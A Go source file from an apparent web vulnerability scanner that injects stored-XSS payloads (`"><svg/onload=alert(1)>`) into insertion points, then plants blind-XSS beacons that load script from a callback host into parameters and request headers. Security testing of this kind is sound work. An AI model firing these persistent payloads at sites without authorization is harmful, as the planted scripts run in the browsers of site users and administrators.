package scanner

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// storedXSSClient does NOT follow redirects and reuses the pooled transport.
var storedXSSClient = newPooledClient(12*time.Second, false)

// newXSSToken returns a short, unique, URL-safe marker token.
func newXSSToken(prefix string) string {
	b := make([]byte, 5)
	_, _ = rand.Read(b)
	return prefix + hex.EncodeToString(b)
}

// RunStoredBlindXSS covers the two XSS classes the reflected engine cannot:
//
//   - STORED: a payload injected on one request that PERSISTS and executes on a
//     later, clean page load. We inject a uniquely-tagged executable payload into
//     every insertion point, then re-fetch candidate pages with NO payload in the
//     request. If the raw, un-encoded payload appears in an executable context on
//     a clean fetch, the input was persisted server-side → stored XSS. This is a
//     stronger definition than "does it reflect": a clean re-fetch cannot reflect
//     anything, so any appearance proves storage.
//
//   - BLIND: a payload that executes somewhere we never see — an admin panel, a
//     support-ticket viewer, a log dashboard. We plant XSS-Hunter-style beacons
//     (`<script src=CALLBACK/bx/TOKEN>`) into params AND into the classic blind
//     sinks (User-Agent, Referer, X-Forwarded-For) and record each token. When a
//     victim's browser runs it and calls back, the API raises a confirmed finding.
//     Requires cfg.BlindXSSCallbackURL to be set (this app's public URL); if it
//     isn't, blind injection is skipped and only stored XSS runs.
func (s *VulnScanner) RunStoredBlindXSS(ctx context.Context, targetID, domain string, logFn LogFunc) error {
	points := loadInsertionPoints(ctx, s.db, targetID, s.cfg.URLLimit())
	if len(points) == 0 {
		return nil
	}
	auth := loadAuthHeaders(ctx, s.db, targetID)

	// ── Stored XSS ────────────────────────────────────────────────────────────
	logFn("info", "stored_xss", fmt.Sprintf("Planting stored-XSS markers on %d insertion points...", len(points)))

	type storedProbe struct {
		token   string
		payload string // the raw executable string we expect to find persisted
		url     string
		param   string
	}
	var probes []storedProbe
	var probesMu sync.Mutex

	sem := make(chan struct{}, 12)
	var wg sync.WaitGroup
	for _, ip := range points {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(ip insertionPoint) {
			defer wg.Done()
			defer func() { <-sem }()
			token := newXSSToken("rcnsto")
			// Context-agnostic executable payload carrying the unique token so we
			// can attribute a persisted hit back to this exact insertion point.
			payload := token + `"><svg/onload=alert(1)>`
			sendInjected(ctx, storedXSSClient, ip, payload, auth)
			probesMu.Lock()
			probes = append(probes, storedProbe{token, payload, ip.URL, ip.Param})
			probesMu.Unlock()
		}(ip)
	}
	wg.Wait()

	// Detection pass: fetch candidate pages with NO payload and look for any
	// persisted marker in an executable context.
	pages := s.storedCandidatePages(ctx, targetID, points)
	logFn("info", "stored_xss", fmt.Sprintf("Re-fetching %d clean pages to detect persistence...", len(pages)))

	var storedFound atomic.Int64
	sem2 := make(chan struct{}, 12)
	var wg2 sync.WaitGroup
	for _, page := range pages {
		if ctx.Err() != nil {
			break
		}
		wg2.Add(1)
		sem2 <- struct{}{}
		go func(pageURL string) {
			defer wg2.Done()
			defer func() { <-sem2 }()
			body := s.cleanFetch(ctx, pageURL, auth)
			if body == "" {
				return
			}
			for _, pr := range probes {
				// The raw payload must survive un-encoded AND the token must land
				// in an executable (non-inert) context on this clean page.
				if !strings.Contains(body, pr.payload) {
					continue
				}
				kind := classifyXSSContext(body, pr.token)
				if kind != ctxInert && kind != ctxNone {
					ev := fmt.Sprintf("Payload injected via %s param=%s persisted and executes on %s",
						pr.url, pr.param, pageURL)
					// Report against the INJECTION point (that's the vulnerable input),
					// noting where it surfaced.
					s.storeVuln(targetID, "stored_xss", "critical", pr.url, pr.param, pr.payload, ev)
					storedFound.Add(1)
					logFn("warn", "stored_xss", fmt.Sprintf("STORED XSS: input %s param=%s executes on %s",
						pr.url, pr.param, pageURL))
					if s.broadcast != nil {
						s.broadcast("new_vuln_finding", map[string]any{
							"target_id": targetID, "type": "stored_xss", "url": pr.url, "parameter": pr.param,
						})
					}
				}
			}
		}(page)
	}
	wg2.Wait()
	logFn("info", "stored_xss", fmt.Sprintf("Stored XSS done. %d persisted execution(s) confirmed.", storedFound.Load()))

	// ── Blind XSS ─────────────────────────────────────────────────────────────
	if err := s.plantBlindXSS(ctx, targetID, points, auth, logFn); err != nil {
		return err
	}
	return nil
}

// storedCandidatePages returns the set of clean pages worth re-fetching to spot
// persisted content: all alive services plus the injected endpoints themselves.
func (s *VulnScanner) storedCandidatePages(ctx context.Context, targetID string, points []insertionPoint) []string {
	seen := map[string]bool{}
	var out []string
	add := func(u string) {
		if u != "" && !seen[u] {
			seen[u] = true
			out = append(out, u)
		}
	}
	rows, err := s.db.QueryContext(ctx, `
		SELECT url FROM http_services
		WHERE target_id = ? AND status_code BETWEEN 200 AND 403
		ORDER BY url LIMIT ?`, targetID, s.cfg.URLLimit())
	if err == nil {
		for rows.Next() {
			var u string
			if rows.Scan(&u) == nil {
				add(u)
			}
		}
		rows.Close()
	}
	for _, ip := range points {
		add(stripQuery(ip.URL))
	}
	return out
}

func (s *VulnScanner) cleanFetch(ctx context.Context, u string, auth map[string]string) string {
	reqCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(reqCtx, "GET", u, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ReconBot/1.0)")
	for k, v := range auth {
		req.Header.Set(k, v)
	}
	resp, err := storedXSSClient.Do(req)
	if err != nil {
		return ""
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	resp.Body.Close()
	// Only trust a page a browser actually renders as HTML. The old guard allowed
	// every text/* type (text/plain, text/css, text/javascript), where a persisted
	// payload cannot execute as markup — a stored-XSS false positive parallel to the
	// reflected-XSS content-type gate. nosniff makes a body-signature guess
	// non-authoritative, so it's honoured here too.
	nosniff := strings.EqualFold(strings.TrimSpace(resp.Header.Get("X-Content-Type-Options")), "nosniff")
	if !browserRendersAsHTML(resp.Header.Get("Content-Type"), string(body), nosniff) {
		return ""
	}
	return string(body)
}

// plantBlindXSS injects XSS-Hunter-style beacons and records their tokens.
// Fire-and-forget: confirmation arrives later via the /bx/<token> callback.
func (s *VulnScanner) plantBlindXSS(ctx context.Context, targetID string, points []insertionPoint, auth map[string]string, logFn LogFunc) error {
	base := strings.TrimRight(s.cfg.BlindXSSCallbackURL, "/")
	if base == "" {
		logFn("info", "blind_xss", "Blind XSS skipped — no callback URL configured (set blind_xss_callback_url to this app's public URL).")
		return nil
	}
	logFn("info", "blind_xss", "Planting blind-XSS beacons into params and header sinks...")

	planted := 0
	sem := make(chan struct{}, 12)
	var wg sync.WaitGroup

	// 1. Parameter sinks.
	for _, ip := range points {
		if ctx.Err() != nil {
			break
		}
		token := newXSSToken("rcnbx")
		s.recordBlindProbe(targetID, token, ip.URL, ip.Param, "param:"+ip.Param)
		planted++
		payload := fmt.Sprintf(`"><script src=%s/bx/%s></script>`, base, token)
		wg.Add(1)
		sem <- struct{}{}
		go func(ip insertionPoint, payload string) {
			defer wg.Done()
			defer func() { <-sem }()
			sendInjected(ctx, storedXSSClient, ip, payload, auth)
		}(ip, payload)
	}

	// 2. Header sinks — the classic blind-XSS surface (log/admin viewers). One
	// request per alive host root, with a beacon in each dangerous header.
	roots := s.aliveRoots(ctx, targetID)
	blindHeaders := []string{"User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host"}
	for _, root := range roots {
		if ctx.Err() != nil {
			break
		}
		token := newXSSToken("rcnbx")
		s.recordBlindProbe(targetID, token, root, "", "headers")
		planted++
		payload := fmt.Sprintf(`"><script src=%s/bx/%s></script>`, base, token)
		wg.Add(1)
		sem <- struct{}{}
		go func(root, payload string) {
			defer wg.Done()
			defer func() { <-sem }()
			reqCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
			defer cancel()
			req, err := http.NewRequestWithContext(reqCtx, "GET", root, nil)
			if err != nil {
				return
			}
			for _, h := range blindHeaders {
				req.Header.Set(h, payload)
			}
			for k, v := range auth {
				req.Header.Set(k, v)
			}
			resp, err := storedXSSClient.Do(req)
			if err == nil {
				resp.Body.Close()
			}
		}(root, payload)
	}
	wg.Wait()
	logFn("info", "blind_xss", fmt.Sprintf("Blind XSS done. %d beacon(s) planted; execution will be reported via callback.", planted))
	return nil
}

func (s *VulnScanner) recordBlindProbe(targetID, token, url, param, sink string) {
	_, _ = s.db.Exec(`
		INSERT INTO blind_xss_probes (token, target_id, url, parameter, sink)
		VALUES (?, ?, ?, ?, ?)
		ON CONFLICT(token) DO NOTHING
	`, token, targetID, url, param, sink)
}

func (s *VulnScanner) aliveRoots(ctx context.Context, targetID string) []string {
	rows, err := s.db.QueryContext(ctx, `
		SELECT DISTINCT url FROM http_services
		WHERE target_id = ? AND status_code BETWEEN 200 AND 403
		ORDER BY url LIMIT 200`, targetID)
	if err != nil {
		return nil
	}
	defer rows.Close()
	seen := map[string]bool{}
	var out []string
	for rows.Next() {
		var u string
		if rows.Scan(&u) != nil {
			continue
		}
		if b := hostBaseScan(u); b != "" && !seen[b] {
			seen[b] = true
			out = append(out, b)
		}
	}
	return out
}
